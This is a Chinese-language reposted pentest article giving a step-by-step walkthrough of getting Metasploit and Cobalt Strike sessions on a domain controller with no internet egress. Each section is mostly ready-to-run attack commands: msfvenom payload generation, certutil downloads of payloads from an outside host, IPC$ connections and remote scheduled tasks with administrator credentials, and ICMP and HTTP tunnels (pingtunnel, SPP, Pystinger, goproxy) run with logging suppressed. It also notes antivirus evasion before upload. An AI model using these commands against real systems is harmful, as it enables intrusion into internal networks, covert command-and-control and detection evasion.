> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RQMcN8b-P9tW79wwyPDxkA)

* * *

  

---

【Hacking黑白红】，一线渗透攻防实战交流公众号

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONQbd1LqAKpAlwVM9pRXpJ8iapW6J2BmBkPWnGk0hia1t6DkVC8Jrl7pvmO5aAf7Kl5HEp7pDaFGffdw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

```


回复“电子书”获取web渗透、CTF电子书:

回复“视频教程”获取渗透测试视频教程;  

回复“内网书籍”获取内网学习书籍;        

回复“CTF工具”获取渗透、CTF全套工具;

回复“内网渗透”；获取内网渗透资料;

回复“护网”；获取护网学习资料 ;

回复“python”,获取python视频教程；

回复“java”，获取Java视频教程;

回复“go”，获取go视频教程


```

  

* * *

  

---

  

前言
==

网络安全的本质是懂进攻，知防守，先正向，后逆向。  
一名优秀的白帽子，是不能有短板的，有的只能是很多的标准板和几块长板。

网络拓扑图
=====

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNPuHUZJ7jSk1dO1c0tTYYez7cHN5LDibxDmJQBY4txKOr7w3cCdBFLow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

一、msf正向木马拿不出网域控shell
====================

msf生成木马
-------

```
msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f raw -o msf1.bin  

```

用msfvenom生成一个正向马传进去（因为无法访问外网，反向出不来），msf正向连接。

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNHXWewL7AXZGgIU4JWfGzZ0swiaEonlAJC5wITxfIH4QstVa6YbALGyA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

域控上线msf
-------

通过域控web服务的shell进行操作，域控远程下载边界跳板机上的马

```
C:\ProgramData\xxxx.exe -i -c "certutil -urlcache -split -f http://xxx.xxx.xxx/msf1.exe msf1.exe  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNqBgic4yKYzQSDzS1L71VVjPOoRrQXWx6Ol0pbuaUuj1KqJy1wbHrfdQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

再通过提权工具进行执行

```
C:\ProgramData\xxxx.exe -i -c "msf1.exe"  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNqBqtlgunuNRhUSVBhw5ddGjCLQiblZ5ibgvTYCkMbjGV38ttcHtydx3w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

msf通过代理开启监听

```
proxychains msfconsole  
use exploit/multi/handler  
set payload windows/x64/meterpreter/bind_tcp  
set RHOST xxx.xxx.xxx  
set lport 4444  
run  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNP3iaLicWOOgJPsHhOYNkhgVSG83Sice5PC2vX6ictVPcGRCtypicTA2rJMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

成功获取域控服务器的shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNt4iaDnrnqQCWsXQyficX0dTxvzuYSibQ9738nfMEsmM7NR0GJsNgxcNPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

二、主机中转监听横向上线不出网域控
=================

设置中转监听
------

![图片](https://mmbiz.qpic.cn/mmbiz_png/3ZX4O1QxGtPhSURDjTxQicyiaibw4sZ09TNyVUrBkuyoKCJNYiaxkFDiazk0y6U9kpaOzugLImWPLsAwNxbFauVqxHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

这个监听IP要内网可以通信的内网IP

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后生成无阶段木马(分阶段木马无法选择中转监听器)，再把木马copy到域控，设置好任务计划，启动木马之后就能够获取域控的shell了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

ipc$+计划任务
---------

通过net use建立IPC$连接

```
shell net use \\x.x.x.x\c$ "xxx" /user:"administrator"  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

利用copy上传后门文件到域控

```
shell copy C:\xxx.exe \\x.x.x.x\c$  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

运行任务，其中/i表示立即运行

```
shell schtasks /run /s x.x.x.x /u Administrator /p xxxx /tn test /i  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

域控成功上线cs
--------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、仅ICMP出网pingtunnel上线msf&cs
===========================

0. 环境搭建
-------

WEB边界服务器是公司对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网同网段存在一台Windows内网服务器域控，Web服务器可以访问该机器远程桌面。当我们拿到web边界服务器的shell之后发现只能使用icmp协议访问公网vps（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器域控进行后续攻击操作。

1. pingtunnel
-------------

注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件  
由于ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密

2. vps服务端开启
-----------

```
./pingtunnel -type server       ##开启服务器模式  

```

回显0连接

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3. 客户端开启
--------

```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
```

客户端本地监听9999端口 ，将监听到的连接流量通过icmpserver发送到vps的Linsten_ip:7777端口  
执行后，kali有回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4. msf上线
--------

制作木马，木马的回连地址为127.0.0.1:9999,运行上线msf

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o msf.exe  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

msf开启监听

```
msfconsole  
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_tcp  
set lhost x.x.x.x  
set lport 7777  
exploit -j  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

把木马msf.exe从蚁剑上传到靶机，运行

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

已上线msf

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

5. CS上线
-------

```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

客户端本地监听9999端口 ，将监听到的连接流量通过icmpserver发送到vps的Linsten_ip:7777端口  
执行后，kali有回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

建立监听127.0.0.1:9999和x.x.x.x:7777

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

对ICMP-127的监听生成木马cs.exe

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

传到靶机运行

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

CS监听上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

四、仅ICMP出网SPP上线Cobalt Strike
===========================

环境搭建
----

WEB边界服务器是公司对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网同网段存在一台Windows内网服务器域控，Web服务器可以访问该机器远程桌面。当我们拿到web边界服务器的shell之后发现只能使用icmp协议访问公网vps（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器域控进行后续攻击操作。

工具：
---

SPP  
反向代理用于进入目标内网，正向代理可配合远控工具进行上线。

1. Server
---------

服务端启动

```
./spp -type server -proto ricmp -listen 0.0.0.0  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2. Client
---------

客户端启动  
-nolog 1不输出日志，-noprint 1不打印内容

```
spp.exe -name "cs" -type proxy_client -server x.x.x.x -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp -nolog 1 -noprint 1  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

vps回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3. 创建SPP Listeners
------------------

配置一个http beacon，Host为vps地址：x.x.x.x，监听8081端口

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4. 创建SPP-127 Linsteners
-----------------------

再起一个本地监听的http beacon，Host为：127.0.0.1（这里也可以换成web跳板机的内网IP：x.x.x.x），监听本地8082

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

5. 生成无阶段木马
----------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

监听器选择SPP-127，进行上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

传到靶机运行

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

此时查看cs已上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

vps回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

将SPP-127 Linsteners的Host换成web跳板机的内网IP：x.x.x.x，监听本地8082

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

生成无阶段木马

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

监听器选择SPP-127，进行上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

传到靶机运行

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

此时查看cs已上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

vps回显

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

五、Pystinger正向代理上线不出网域控到cs
=========================

工具：
---

Pystinger

条件：
---

1.    
    
2.  TCP、ICMP、DNS均不出网。
    
3.    
    
4.  具有Web服务，并获得Webshell权限。  
    web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

环境机器不可以ping通其他机器

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

1. 上传代理文件
---------

1.    
    
2.  通过Webshell上传Pystinger的对应语言的Webshell到目标机器，实现内网SOCK4代理， 确保http://x.x.x.x/pystinger/proxy.php可以访问，页面返回 UTF-8。
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2. 服务端运行
--------

参考github上Cobalt Strike多主机上线方式，上传stingger_server.exe到目标机器，然后运行

```
start stinger_server.exe 0.0.0.0  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3. 客户端运行
--------

在VPS上上传stinger_client，-w proxy的url地址，执行

```
./stinger_client -w http://x.x.x.x/pystinger/proxy.php -l 0.0.0.0 -p 60000  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4. 创建监听器
--------

Cobalt Strike新建监听pystinger，多主机上线设置Host为目标机器能够与更深层机器相连的内网ip：x.x.x.x，端口为60020。  
单主机上线设置Host为目标机器的ip：127.0.0.1，端口为60020，只能本主机上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

5. 生成木马
-------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

蚁剑运行木马文件

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

此时查看cs已上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

六、goproxy http代理上线不出网域控到cs
==========================

工具：
---

goproxy

条件：
---

1.    
    
2.  TCP、ICMP、DNS均不出网。
    
3.    
    
4.  具有Web服务，并获得Webshell权限。  
    web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

环境机器不可以ping通其他机器

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

1. 上传proxy.exe
--------------

通过Webshell上传proxy.exe到目标机器的可读可写目录，执行以下命令在这台出网主机开启一个4444端口的HTTP服务，供后面与不出网域控通讯。

```
proxy.exe http -t tcp -p "0.0.0.0:4444" --daemon  
netstat -ano  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2. 创建监听器
--------

Cobalt strike创建监听器，代理地址为不出网域控能访问到的地址，http://x.x.x.x:4444

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3. 生成木马
-------

有效荷载选择Windows Executable(S)，不然无法上线

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后利用蚁剑将该文件上传到web服务器供不出网域控下载使用。  
不出网win2008执行如下命令，要写不出网win2008同层能访问到的地址，下载CS的有效载荷。  
certutil -urlcache -split -f http://x.x.x.x/xxx.exe C:\xxx.exe

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

执行木马

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功上线cs

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

七、内存加载不出网域控上线cs
===============

条件：
---

1.    
    
2.  TCP、ICMP、DNS均不出网。
    
3.    
    
4.  具有Web服务，并获得Webshell权限。  
    web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

环境机器不可以ping通其他机器

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

1. 拿跳板机session
--------------

首先拿到跳板机的一个Administrator权限的session

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2. 创建监听器
--------

创建一个Bind TCP Listener

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3. 生成木马
-------

生成无阶段木马

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀后上传到跳板机的C:\

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4.内存加载xxx.exe
-------------

```
execute-assembly C:\xxx.exe -m=psexec -i=x.x.x.x -u=administrator -p=xxxx -d=xxx -f=C:\xxx.exe -e=C:\xxx.exe  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

5.连接目标机
-------

```
connect x.x.x.x 4444  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

6.查看cs目标已成功上线
-------------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**转载于https://xz.aliyun.com/t/10626**

**侵权，私聊删除。**

  

  

  

_**渗透实战系列**_

  

  

▶[【渗透实战系列】|43-某次通用型漏洞挖掘思路分享](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247512229&idx=1&sn=de5f7a7fe64b77b8843a48049a7775a8&chksm=ce641a3cf913932a21032b326c654300d5b7a5eff960c6a2e27398e35456aa05833bb5439a90&scene=21#wechat_redirect)

▶[【渗透实战系列】|42-防范诈骗，记一次帮助粉丝渗透黑入某盘诈骗的实战](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247510964&idx=1&sn=4b857ff3d26e56b291d18493232d0638&chksm=ce64012df913883b73fcf343810440eb9c19f523880337af0c9b622e61d67fcddce8f0a272f6&scene=21#wechat_redirect)

▶[【渗透实战系列】|41-记一次色*情app渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247509187&idx=1&sn=34722c6498eb7bbe372f2201bf908c1b&chksm=ce640e5af913874c23a060281b6d0d30a8cab97beeb4e1a03be251a4e08da9041a0720dcec0c&scene=21#wechat_redirect)

▶[【渗透实战系列】|40-APP渗透测试步骤（环境、代理、抓包挖洞）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247507650&idx=2&sn=76005600d8c42ecb604536089fc4444e&chksm=ce64745bf913fd4d49a2055f9b1184967eaff3b6be6a07ea92022665331df84dbec2ed142833&scene=21#wechat_redirect)

[▶【渗透实战系列】|39-BC渗透的常见切入点（总结）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247506967&idx=1&sn=571938dac191539a98b76c02203a8394&chksm=ce64768ef913ff980ea03760984c375b5103a649595b4794a8cc31514cec5669543241296bef&scene=21#wechat_redirect)

▶[【渗透实战系列】|38-对某色情直播渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247506696&idx=1&sn=f6217101c0940b1e74c1d8715c1f3f0e&chksm=ce647191f913f887951f379c0aa305f818764b78f81edcd0a5517fe946c2bebacab7add3af70&scene=21#wechat_redirect)

▶[【渗透实战系列】|37-6年级小学生把学校的网站给搞了！](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247506002&idx=1&sn=f6ba883a729ec9238ddac2354e3b0227&chksm=ce6472cbf913fbdd4dd1810297e06414fd1b1f5aaed37a662453a3a63202fad356f502652bfb&scene=21#wechat_redirect)

▶[【渗透实战系列】|36-一次bc推广渗透实战](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247502971&idx=1&sn=9f0793a2dd495d31d4c7f3888f408d93&chksm=ce6466e2f913eff421f3808538ee1e227c4797051a71509caa8d216e6ed6b56f51c3948e87f1&scene=21#wechat_redirect)

▶[【渗透实战系列】|35-旁站信息泄露的dedecms站点渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247502760&idx=2&sn=32c3aac95cc15c84c42b071425d19f91&chksm=ce646131f913e8279797a39aa8f513d7907d0e7c06ed0e4352b7603cb2d014a4a17eeac548ce&scene=21#wechat_redirect)

▶[【渗透实战系列】|34-如何用渗透思路分析网贷诈骗链](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247502166&idx=1&sn=3fe78999b5b43a059e66975dd185b3cc&chksm=ce6463cff913ead9c3a448d7466b7c38ed593a709918265283387ad4bb787292bdd2979e7d64&scene=21#wechat_redirect)

▶[【渗透实战系列】|33-App渗透 ,由sql注入、绕过人脸识别、成功登录APP](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247501582&idx=1&sn=6c1f7e2d823e1534dfcd419bbd6269eb&chksm=ce646d97f913e481224810cb34eac51cfcbf4c898bf1a2c309295d24d06231f9984c743ae8d4&scene=21#wechat_redirect)

▶[【渗透实战系列】|32-FOFA寻找漏洞，绕过杀软拿下目标站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247500037&idx=1&sn=d59534ffc13b5dcbc64e93997ab3b485&chksm=ce646b9cf913e28a1c35e0f9919d48089bbb2e6b74ddb51ba27928c5cca0b361c4c80b0d03ea&scene=21#wechat_redirect)

▶[【渗透实战系列】|31-记一次对学校的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247497185&idx=1&sn=10025ea64a53bd4cce9ac791f3dd5e20&chksm=ce645f78f913d66e4c3851afdb2a25a655f2d80a817cf417b8f3be0d498135eff98a16c9cf86&scene=21#wechat_redirect)

▶[【渗透实战系列】|30-从SQL注入渗透内网（渗透的本质就是信息搜集）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247492600&idx=1&sn=96ffe18e7d13485dce4fce75863a3a3e&chksm=ce644961f913c077544775c87a3f6f5aa32c43424756a09806e715075e3f0479e1451b6ed114&scene=21#wechat_redirect)

▶[【渗透实战系列】|29-实战|对某勒索APP的Getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247491951&idx=1&sn=38abc3e92e234e6cf9734c4f73537561&chksm=ce644bf6f913c2e0dea91966fc01a004ce9cff0e596ddfc5b64d5e9f44ab5f2649bb4b5060a3&scene=21#wechat_redirect)  

▶[【渗透实战系列】|28-我是如何拿下BC站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247491584&idx=1&sn=d7be0c7c6b7bce795fbf15d3ad781329&chksm=ce644a99f913c38f205db6560c11b32ad240c4e45795aa670b9edbd05f48c54069e04dbde329&scene=21#wechat_redirect)

▶[【渗透实战系列】|27-对钓鱼诈骗网站的渗透测试（成功获取管理员真实IP）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247491135&idx=1&sn=1fc02f90c8f4fc93a70600da5e6b74bd&chksm=ce67b4a6f9103db0b0dbe9aebb44b910bc5b9bcebebb53f2d71216de2772f434730f825d0aae&scene=21#wechat_redirect)

▶[【渗透实战系列】|26一记某cms审计过程(步骤详细)](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247490747&idx=1&sn=70a1e5cf68fd3c4f03737be331f93fd3&chksm=ce67b622f9103f34c2a4f150c2ea47aea01fc5ec3da10e45b36bc817ff54ffc0b013126f5f56&scene=21#wechat_redirect)

▶[【渗透实战系列】|25一次从 APP 逆向到 Getshell 的过程](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247490236&idx=2&sn=2eddaa77b0e7910c67285a855efb1a05&chksm=ce67b025f9103933121b6df068aed6fd99feaac7a04183e0a773086633a7bd7f85339c5bd82e&scene=21#wechat_redirect)

